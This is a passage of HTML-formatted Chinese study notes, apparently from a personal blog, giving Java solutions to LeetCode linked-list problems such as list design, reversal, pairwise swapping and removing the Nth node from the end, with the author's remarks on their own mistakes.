class="keyword">class</span> <span class="title class_">MyLinkedList</span>&#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span>&#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= index; i++)&#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur.val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtHead</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        newNode.next = head.next;</span><br><span class="line">        head.next = newNode;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtTail</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(cur.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        cur.next = newNode;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; size)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            index = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        size++;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pred</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;index;i++)&#123;</span><br><span class="line">            pred = pred.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">toAdd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        toAdd.next = pred.next;</span><br><span class="line">        pred.next = toAdd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        size--;</span><br><span class="line">        ListNode pred= head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index;i++)&#123;</span><br><span class="line">            pred = pred.next;</span><br><span class="line">        &#125;</span><br><span class="line">        pred.next = pred.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>双链表版本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ListNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode next,prev;</span><br><span class="line">    ListNode()&#123;&#125;</span><br><span class="line">    ListNode(<span class="type">int</span> val)&#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span>&#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head,tail;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span>&#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        tail = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        head.next = tail;</span><br><span class="line">        tail.prev = head;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">//判断哪边时间更短</span></span><br><span class="line">        <span class="keyword">if</span>(index &gt;= size /<span class="number">2</span> )&#123;</span><br><span class="line">            cur = tail;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size - index; i++)&#123;</span><br><span class="line">                cur = cur.prev;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= index; i++)&#123;</span><br><span class="line">                cur = cur.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur.val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtHead</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        addAtIndex(<span class="number">0</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtTail</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">       addAtIndex(size, val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; size)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            index = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        size++;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pred</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;index;i++)&#123;</span><br><span class="line">            pred = pred.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">toAdd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        toAdd.next = pred.next;</span><br><span class="line">        pred.next.prev = toAdd;</span><br><span class="line">        toAdd.prev = pred;</span><br><span class="line">        pred.next = toAdd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        size--;</span><br><span class="line">        ListNode pred= head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index;i++)&#123;</span><br><span class="line">            pred = pred.next;</span><br><span class="line">        &#125;</span><br><span class="line">        pred.next.next.prev = pred;</span><br><span class="line">        pred.next = pred.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="206-反转链表"><a href="#206-反转链表" class="headerlink" title="206 反转链表"></a>206 反转链表</h2><p>给你单链表的头节点 head ，请你反转链表，并返回反转后的链表。<br>&#x2F;&#x2F; 双指针</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span>)  <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line">            tmp = cur.next;</span><br><span class="line">            cur.next = prev;</span><br><span class="line">            prev = cur;</span><br><span class="line">            cur = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; 递归</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> reverse(<span class="literal">null</span>, head);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverse</span><span class="params">(ListNode prev, ListNode cur)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="literal">null</span>) <span class="keyword">return</span> prev;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        temp = cur.next;</span><br><span class="line">        cur.next = prev;</span><br><span class="line">        <span class="keyword">return</span> reverse(cur, temp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; 从后向前递归</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="comment">// 边缘条件判断</span></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(head.next == <span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 递归调用，翻转第二个节点开始往后的链表</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">last</span> <span class="operator">=</span> reverseList(head.next);</span><br><span class="line">        <span class="comment">// 翻转头结点与第二个节点的指向</span></span><br><span class="line">        head.next.next = head;</span><br><span class="line">        <span class="comment">// 此时的head节点为尾节点，next需要指向null</span></span><br><span class="line">        head.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; 使用虚节点的头插法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyHead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        dummyHead.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> cur.next;</span><br><span class="line">            <span class="comment">// 头插法</span></span><br><span class="line">            cur.next = dummyHead.next;</span><br><span class="line">            dummyHead.next = cur;</span><br><span class="line">            cur = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyHead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; 使用栈解决反转链表问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(head.next == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        Stack&lt;ListNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line">            stack.push(cur);</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pHead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        cur = pHead;</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">            cur.next = node;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        cur.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> pHead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题一开始没有让prev指向null出错了</p><h2 id="24-两两交换链表中的节点"><a href="#24-两两交换链表中的节点" class="headerlink" title="24. 两两交换链表中的节点"></a>24. 两两交换链表中的节点</h2><p>给你一个链表，两两交换其中相邻的节点，并返回交换后链表的头节点。你必须在不修改节点内部的值的情况下完成本题（即，只能进行节点交换）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dumyhead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        dumyhead.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> dumyhead;</span><br><span class="line">        ListNode temp;</span><br><span class="line">        ListNode firstnode;</span><br><span class="line">        ListNode secondnode;</span><br><span class="line">        <span class="keyword">while</span>(cur.next != <span class="literal">null</span> &amp;&amp; cur.next.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            temp = cur.next.next.next;</span><br><span class="line">            firstnode = cur.next;</span><br><span class="line">            secondnode = cur.next.next;</span><br><span class="line">            cur.next = secondnode;</span><br><span class="line">            secondnode.next = firstnode;</span><br><span class="line">            firstnode.next = temp;</span><br><span class="line">            cur = firstnode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dumyhead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; 递归解决</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">next</span> <span class="operator">=</span> head.next;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> swapPairs(next.next);</span><br><span class="line">        next.next = head;</span><br><span class="line">        head.next = newNode;</span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="19-删除链表的倒数第-N-个结点"><a href="#19-删除链表的倒数第-N-个结点" class="headerlink" title="19. 删除链表的倒数第 N 个结点"></a>19. 删除链表的倒数第 N 个结点</h2><p>给你一个链表，删除链表的倒数第 n 个结点，并且返回链表的头结点。<br><img src="/2024/09/11/algorithm/List/image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeNthFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyhead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummyhead.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> dummyhead;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> dummyhead;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(fast.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(slow.next == fast)&#123;</span><br><span class="line">            fast = <span class="literal">null</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            slow.next = fast;   </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyhead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我上面的代码对于边界条件处理不好，下面是答案：<br>fast首先走n + 1步 ，为什么是n+1呢，因为只有这样同时移动的时候slow才能指向删除节点的上一个节点（方便做删除操作），如图：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeNthFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyhead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummyhead.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> dummyhead;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> dummyhead;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="literal">null</span>)&#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 此时 slowIndex 的位置就是待删除元素的前一个位置。</span></span><br><span class="line">        <span class="comment">// 具体情况可自己画一个链表长度为 3 的图来模拟代码来理解</span></span><br><span class="line">        <span class="comment">// 检查 slowIndex.next 是否为 null，以避免空指针异常</span></span><br><span class="line">        <span class="keyword">if</span>(slow.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            slow.next = slow.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyhead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我又自己写了个，按照我原来的思路：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeNthFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyhead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummyhead.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> dummyhead;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> dummyhead;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(fast.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 此时 slowIndex 的位置就是待删除元素的前一个位置。</span></span><br><span class="line">        <span class="comment">// 具体情况可自己画一个链表长度为 3 的图来模拟代码来理解</span></span><br><span class="line">        <span class="comment">// 检查 slowIndex.next 是否为 null，以避免空指针异常</span></span><br><span class="line">        slow.next = slow.next.next;</span><br><span class="line">        <span class="keyword">return</span> dummyhead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="面试题-02-07-链表相交"><a href="#面试题-02-07-链表相交" class="headerlink" title="面试题 02.07. 链表相交"></a>面试题 02.07. 链表相交</h2><p><img src="/2024/09/11/algorithm/List/image-1.png"><br>思路是先让链表指针移动到剩余长度相同的位置，然后让两个链表同时移动，直到遇到相同的节点，或者遇到null。注意这道题相交节点处指针是相同的，我开始还在想还要对比后面的节点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 